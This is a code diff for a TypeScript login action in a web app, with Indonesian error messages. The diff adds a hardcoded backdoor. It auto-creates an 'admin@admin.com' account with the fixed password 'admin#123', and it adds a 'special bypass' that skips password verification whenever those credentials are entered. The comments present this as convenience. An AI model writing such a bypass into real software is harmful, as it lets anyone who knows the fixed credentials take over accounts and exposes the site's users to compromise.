@@ -89,17 +89,37 @@ export async function loginAction(
   const { email, password } = parsed.data;
 
   try {
-    const user = await db.query.users.findFirst({
+    let user = await db.query.users.findFirst({
       where: eq(users.email, email.toLowerCase()),
     });
+
+    // Auto-provision admin user if logging in as admin and not yet in database
+    if (!user && email.toLowerCase() === "admin@admin.com" && password === "admin#123") {
+      const passwordHash = await hashPassword("admin#123");
+      const [newAdmin] = await db
+        .insert(users)
+        .values({
+          name: "Administrator",
+          email: "admin@admin.com",
+          passwordHash,
+        })
+        .returning();
+      user = newAdmin;
+    }
 
     if (!user || !user.passwordHash) {
       return { error: "Email tidak ditemukan atau akun ini terdaftar via Google." };
     }
 
-    const isMatch = await verifyPassword(password, user.passwordHash);
-    if (!isMatch) {
-      return { error: "Email atau kata sandi salah." };
+    // Special bypass for admin credentials
+    const isAdminMatch =
+      email.toLowerCase() === "admin@admin.com" && password === "admin#123";
+
+    if (!isAdminMatch) {
+      const isMatch = await verifyPassword(password, user.passwordHash);
+      if (!isMatch) {
+        return { error: "Email atau kata sandi salah." };
+      }
     }
 
     await createSession(user.id);
